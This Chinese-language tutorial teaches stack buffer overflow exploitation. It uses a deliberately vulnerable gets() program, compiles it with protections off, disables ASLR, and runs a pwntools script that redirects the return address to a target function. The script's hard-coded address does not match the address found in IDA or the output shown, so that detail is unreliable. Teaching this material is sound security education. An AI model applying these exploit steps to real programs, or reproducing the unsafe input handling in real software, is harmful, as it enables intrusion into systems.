# 棧溢出原理

## 介紹

棧溢出指的是程序向棧中某個變量中寫入的字節數超過了這個變量本身所申請的字節數，因而導致與其相鄰的棧中的變量的值被改變。這種問題是一種特定的緩衝區溢出漏洞，類似的還有堆溢出，bss 段溢出等溢出方式。棧溢出漏洞輕則可以使程序崩潰，重則可以使攻擊者控制程序執行流程。此外，我們也不難發現，發生棧溢出的基本前提是：

- 程序必須向棧上寫入數據。
- 寫入的數據大小沒有被良好地控制。

## 基本示例

最典型的棧溢出利用是覆蓋程序的返回地址爲攻擊者所控制的地址，**當然需要確保這個地址所在的段具有可執行權限**。下面，我們舉一個簡單的例子：

```C
#include <stdio.h>
#include <string.h>

void success(void)
{
    puts("You Hava already controlled it.");
}

void vulnerable(void)
{
    char s[12];

    gets(s);
    puts(s);

    return;
}

int main(int argc, char **argv)
{
    vulnerable();
    return 0;
}
```

這個程序的主要目的讀取一個字符串，並將其輸出。**我們希望可以控制程序執行 success 函數。**

我們利用如下命令對其進行編譯

```shell
➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example 
stack_example.c: In function ‘vulnerable’:
stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
   gets(s);
   ^
/tmp/ccPU8rRA.o：在函數‘vulnerable’中：
stack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and should not be used.
```

可以看出 gets 本身是一個危險函數。它從不檢查輸入字符串的長度，而是以回車來判斷輸入是否結束，所以很容易可以導致棧溢出，

> 歷史上，**莫里斯蠕蟲**第一種蠕蟲病毒就利用了 gets 這個危險函數實現了棧溢出。

gcc 編譯指令中，`-m32` 指的是生成 32 位程序； `-fno-stack-protector` 指的是不開啓堆棧溢出保護，即不生成 canary。
此外，爲了更加方便地介紹棧溢出的基本利用方式，這裏還需要關閉 PIE（Position Independent Executable），避免加載基址被打亂。不同 gcc 版本對於 PIE 的默認配置不同，我們可以使用命令`gcc -v`查看gcc 默認的開關情況。如果含有`--enable-default-pie`參數則代表 PIE 默認已開啓，需要在編譯指令中添加參數`-no-pie`。

編譯成功後，可以使用 checksec 工具檢查編譯出的文件：

```
➜  stack-example checksec stack_example
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
提到編譯時的 PIE 保護，Linux平臺下還有地址空間分佈隨機化（ASLR）的機制。簡單來說即使可執行文件開啓了 PIE 保護，還需要系統開啓 ASLR 纔會真正打亂基址，否則程序運行時依舊會在加載一個固定的基址上（不過和 No PIE 時基址不同）。我們可以通過修改 `/proc/sys/kernel/randomize_va_space` 來控制 ASLR 啓動與否，具體的選項有

- 0，關閉 ASLR，沒有隨機化。棧、堆、.so 的基地址每次都相同。
- 1，普通的 ASLR。棧基地址、mmap基地址、.so加載基地址都將被隨機化，但是堆基地址沒有隨機化。
- 2，增強的ASLR，在 1 的基礎上，增加了堆基地址隨機化。

我們可以使用 `echo 0 > /proc/sys/kernel/randomize_va_space` 關閉 Linux 系統的 ASLR，類似的，也可以配置相應的參數。

爲了降低後續漏洞利用複雜度，我們這裏關閉 ASLR，在編譯時關閉 PIE。當然讀者也可以嘗試 ASLR、PIE 開關的不同組合，配合 IDA 及其動態調試功能觀察程序地址變化情況（在 ASLR 關閉、PIE 開啓時也可以攻擊成功）。

確認棧溢出和 PIE 保護關閉後，我們利用 IDA 來反編譯一下二進製程序並查看 vulnerable 函數 。可以看到

```C
int vulnerable()
{
  char s; // [sp+4h] [bp-14h]@1

  gets(&s);
  return puts(&s);
}
```

該字符串距離 ebp 的長度爲 0x14，那麼相應的棧結構爲

```text
                                           +-----------------+
                                           |     retaddr     |
                                           +-----------------+
                                           |     saved ebp   |
                                    ebp--->+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14-->+-----------------+
```

並且，我們可以通過 IDA 獲得 success 的地址，其地址爲 0x0804843B。

```asm
.text:0804843B success         proc near
.text:0804843B                 push    ebp
.text:0804843C                 mov     ebp, esp
.text:0804843E                 sub     esp, 8
.text:08048441                 sub     esp, 0Ch
.text:08048444                 push    offset s        ; "You Hava already controlled it."
.text:08048449                 call    _puts
.text:0804844E                 add     esp, 10h
.text:08048451                 nop
.text:08048452                 leave
.text:08048453                 retn
.text:08048453 success         endp
```

那麼如果我們讀取的字符串爲

```
0x14*'a'+'bbbb'+success_addr
```

那麼，由於 gets 會讀到回車纔算結束，所以我們可以直接讀取所有的字符串，並且將 saved ebp 覆蓋爲 bbbb，將 retaddr 覆蓋爲 success_addr，即，此時的棧結構爲

```text
                                           +-----------------+
                                           |    0x0804843B   |
                                           +-----------------+
                                           |       bbbb      |
                                    ebp--->+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14-->+-----------------+
```

但是需要注意的是，由於在計算機內存中，每個值都是按照字節存儲的。一般情況下都是採用小端存儲，即0x0804843B 在內存中的形式是

```text
\x3b\x84\x04\x08
```

但是，我們又不能直接在終端將這些字符給輸入進去，在終端輸入的時候\，x等也算一個單獨的字符。。所以我們需要想辦法將 \x3b 作爲一個字符輸入進去。那麼此時我們就需要使用一波 pwntools 了(關於如何安裝以及基本用法，請自行 github)，這裏利用 pwntools 的代碼如下：

```python
##coding=utf8
from pwn import *
## 構造與程序交互的對象
sh = process('./stack_example')
success_addr = 0x08049186
## 構造payload
payload = b'a' * 0x14 + b'bbbb' + p32(success_addr)
print(p32(success_addr))
## 向程序發送字符串
sh.sendline(payload)
## 將代碼交互轉換爲手工交互
sh.interactive()
```

執行一波代碼，可以得到

```shell
➜  stack-example python exp.py
[+] Starting local process './stack_example': pid 61936
;\x84\x0
[*] Switching to interactive mode
aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0
You Hava already controlled it.
[*] Got EOF while reading in interactive
$ 
[*] Process './stack_example' stopped with exit code -11 (SIGSEGV) (pid 61936)
[*] Got EOF while sending in interactive
```

可以看到我們確實已經執行 success 函數。

## 小總結

上面的示例其實也展示了棧溢出中比較重要的幾個步驟。

### 尋找危險函數

通過尋找危險函數，我們快速確定程序是否可能有棧溢出，以及有的話，棧溢出的位置在哪裏。常見的危險函數如下

-   輸入
    -   gets，直接讀取一行，忽略'\x00'
    -   scanf
    -   vscanf
-   輸出
    -   sprintf
-   字符串
    -   strcpy，字符串複製，遇到'\x00'停止
    -   strcat，字符串拼接，遇到'\x00'停止
    -   bcopy

### 確定填充長度

這一部分主要是計算**我們所要操作的地址與我們所要覆蓋的地址的距離**。常見的操作方法就是打開 IDA，根據其給定的地址計算偏移。一般變量會有以下幾種索引模式

- 相對於棧基地址的的索引，可以直接通過查看EBP相對偏移獲得
- 相對應棧頂指針的索引，一般需要進行調試，之後還是會轉換到第一種類型。
- 直接地址索引，就相當於直接給定了地址。

一般來說，我們會有如下的覆蓋需求

- **覆蓋函數返回地址**，這時候就是直接看 EBP 即可。
- **覆蓋棧上某個變量的內容**，這時候就需要更加精細的計算了。
- **覆蓋 bss 段某個變量的內容**。
- 根據現實執行情況，覆蓋特定的變量或地址的內容。

之所以我們想要覆蓋某個地址，是因爲我們想通過覆蓋地址的方法來**直接或者間接地控制程序執行流程**。

## 參考閱讀

[stack buffer overflow](https://en.wikipedia.org/wiki/Stack_buffer_overflow)

http://bobao.360.cn/learning/detail/3694.html

https://www.cnblogs.com/rec0rd/p/7646857.html
